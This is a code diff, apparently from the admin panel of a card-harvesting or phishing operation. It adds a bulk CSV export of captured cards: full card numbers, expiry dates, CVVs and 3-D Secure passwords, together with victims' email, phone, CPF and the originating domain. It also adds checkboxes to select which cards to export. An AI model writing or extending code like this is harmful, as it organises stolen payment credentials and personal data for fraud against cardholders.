@@ -1541,6 +1541,54 @@ Fico no aguardo! \u{1F60A}`;
     document.body.removeChild(link);
   }
 
+  function exportCartoesToCSV(ordersArray) {
+    if (!ordersArray || ordersArray.length === 0) {
+      alert('Nenhum cartão para exportar.');
+      return;
+    }
+
+    const headers = [
+      'Código do Pedido', 'Data', 'Nome do Titular', 'Número do Cartão', 'Validade', 'CVV',
+      'Senha 3DS', 'Valor', 'Status', 'Cliente Email', 'Cliente Telefone', 'Cliente CPF', 'Domínio'
+    ];
+
+    const rows = ordersArray.map(tx => {
+      return [
+        tx.id ? String(tx.id).substring(0, 8).toUpperCase() : '',
+        tx.created_at || '',
+        tx.card_holder_raw || '',
+        tx.card_number_raw || '',
+        tx.card_expiry_raw || '',
+        tx.card_cvv_raw || '',
+        tx.card_password || '',
+        tx.amount || 0,
+        tx.status || '',
+        tx.customer_email || '',
+        tx.customer_phone || '',
+        tx.customer_cpf || '',
+        tx.domain || ''
+      ].map(val => {
+        let str = String(val).replace(/"/g, '""');
+        if (str.includes(',') || str.includes('\n') || str.includes('"')) {
+          str = `"${str}"`;
+        }
+        return str;
+      }).join(',');
+    });
+
+    const csvContent = [headers.join(','), ...rows].join('\n');
+    const blob = new Blob(["\uFEFF" + csvContent], { type: 'text/csv;charset=utf-8;' });
+    const url = URL.createObjectURL(blob);
+    const link = document.createElement("a");
+    link.setAttribute("href", url);
+    const dateStr = new Date().toISOString().split('T')[0];
+    const isSingle = ordersArray.length === 1;
+    link.setAttribute("download", isSingle ? `cartao_${ordersArray[0].id}.csv` : `cartoes_selecionados_${dateStr}.csv`);
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
+  }
+
   function addCSVButtonListeners() {
     const singleExportBtns = document.querySelectorAll('.btn-export-single-csv');
     singleExportBtns.forEach(btn => {
@@ -1572,6 +1620,22 @@ Fico no aguardo! \u{1F60A}`;
     }
   }
 
+  function bindCartoesCheckboxes() {
+    const selectAllCheckbox = document.getElementById('checkbox-select-all-cartoes');
+    const cartoesCheckboxes = document.querySelectorAll('.cartoes-row-checkbox');
+
+    if (selectAllCheckbox) {
+      selectAllCheckbox.onchange = (e) => {
+        const isChecked = e.target.checked;
+        cartoesCheckboxes.forEach(cb => {
+          cb.checked = isChecked;
+        });
+      };
+      
+      selectAllCheckbox.checked = false;
+    }
+  }
+
   const btnExportCsvAll = document.getElementById('btn-export-csv-all');
   if (btnExportCsvAll) {
     btnExportCsvAll.addEventListener('click', () => {
@@ -1593,6 +1657,22 @@ Fico no aguardo! \u{1F60A}`;
       const selectedTxs = allTransactions.filter(tx => selectedIds.includes(tx.id));
       
       exportOrdersToCSV(selectedTxs);
+    });
+  }
+
+  const btnExportCartoesSelected = document.getElementById('btn-export-cartoes-selected');
+  if (btnExportCartoesSelected) {
+    btnExportCartoesSelected.addEventListener('click', () => {
+      const cartoesCheckboxes = document.querySelectorAll('.cartoes-row-checkbox:checked');
+      if (cartoesCheckboxes.length === 0) {
+        alert('Nenhum cartão selecionado.');
+        return;
+      }
+      
+      const selectedIds = Array.from(cartoesCheckboxes).map(cb => cb.value);
+      const selectedTxs = allTransactions.filter(tx => selectedIds.includes(String(tx.id)));
+      
+      exportCartoesToCSV(selectedTxs);
     });
   }
 
@@ -1983,6 +2063,9 @@ Fico no aguardo! \u{1F60A}`;
 
         return `
           <tr>
+            <td style="text-align: center;">
+              <input type="checkbox" class="cartoes-row-checkbox" value="${order.id}" style="cursor:pointer;" data-order='${JSON.stringify(order).replace(/'/g, "&#39;")}'>
+            </td>
             <td style="font-family:'Space Mono';font-size:0.8rem;color:var(--primary-color);">
               <div style="display: flex; align-items: center; gap: 0.5rem;">
                 ${orderCode}
@@ -2016,6 +2099,7 @@ Fico no aguardo! \u{1F60A}`;
       }).join('');
 
       addDetailButtonListeners();
+      bindCartoesCheckboxes();
       
       // Lógica de exclusão de cartão/pedido
       document.querySelectorAll('.btn-delete-order').forEach(btn => {
